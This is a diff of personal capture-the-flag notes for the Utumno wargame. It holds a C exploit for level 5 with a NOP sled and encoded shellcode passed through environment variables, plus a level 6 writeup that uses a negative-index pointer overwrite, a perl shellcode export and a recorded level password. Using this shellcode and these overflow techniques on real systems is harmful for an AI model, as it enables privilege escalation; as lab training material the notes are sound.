@@ -355,35 +355,87 @@ I find exploit environment variable address at: 0xffffdf3b ~ 0xffffdf40
 The final program which gives immediate priviledge escalation
 #include <unistd.h>
 int main() {
-        char *args[] = { NULL };
-        char *envp[] = { 
-                "AAAA",
-                "BBBB",
-                "CCCC",
-                "DDDD",
-                "EEEE",
-                "FFFF",
-                "AAAA",
-                "BBBB",
-                "AAAABBBBCCCCDDDD\x40\xdf\xff\xff",
-                "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
-                 \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
-                 \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
-                 \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
-                 \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
-                 \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9
-                 \xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b
-                 \x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30
-                 \x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81",
-                NULL };
-        execve("/utumno/utumno5", args, envp);
-        return 0;
+  char *args[] = { NULL };
+  char *envp[] = { 
+    "AAAA",
+    "BBBB",
+    "CCCC",
+    "DDDD",
+    "EEEE",
+    "FFFF",
+    "AAAA",
+    "BBBB",
+    "AAAABBBBCCCCDDDD\x40\xdf\xff\xff",
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+     \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+     \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+     \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+     \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+     \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9
+     \xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b
+     \x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30
+     \x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81",
+    NULL };
+  execve("/utumno/utumno5", args, envp);
+  return 0;
 }
 
 ###################################################################################################
 
 Level:    6
+Exploit:  stack overwrite
+Password: VHOuCx7iA5
+
+Appears to require 3 arguments
+	int main(int argc,char **argv) {
+		b;
+		int pos;
+		int val;
+		if (argc < 3) {            <-- Requires 3 args 
+			puts("Missing args");
+			exit(1);
+		}
+		b.p = malloc(0x20);
+		if (b.p == (char *)0x0) {
+			puts("Sorry, ran out of memory :-(");
+			exit(1);
+		}
+		uVar1 = strtoul(argv[2],(char **)0x0,0x10);
+		uVar2 = strtoul(argv[1],(char **)0x0,10);
+		if (10 < (int)uVar2) {
+			puts("Illegal position in table, quitting..");
+			exit(1);
+		}
+		b.table[uVar2] = uVar1;            <-- arg1 can be negative?
+		strcpy(b.p, argv[3]);              <-- potential buffer overflow?
+		printf("Table position %d has value %d\nDescription: %s\n", uVar2, b.table[uVar2], b.p);
+		return 0;
+	}
+
+Find the location where b.table & b.p are.
+b.p at:             0xffffd344   
+b.table[0] at:      0xffffd348  
+
+This means that b.table[-1] will overwrite b.p. Therefore we can write argv[3] to address argv[2]
+$ ./utumno6 -1 [RET ADDR POS] [NEW RET ADDR VALUE]
+
+An important problem is that the return val's address will be slightly different outside of gdb.
+Must guess both the ret val's addr & guess the address within NOP sled in exploit. Because of this,
+it is helpful to leverage a massive NOP sled, kilobytes to ease the guessing process.
+
+Place EXPLOIT environment variable. Set the EXPLOIT ADDR to the environment variable.
+$ export EXPLOIT=$(perl -e 'print "\x90"x1000 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80
+  \xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b
+  \x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')
+ret val addr: 0xffffcf4c
+exploit env var: 0xffffd1d9
+$ ./utumno6 -1 0xffffcf6c $(perl -e 'print "\xf0\xd1\xff\xff"')
+
+###################################################################################################
+
+Level:    7
 Exploit:  
 Password: 
 
 ###################################################################################################
+
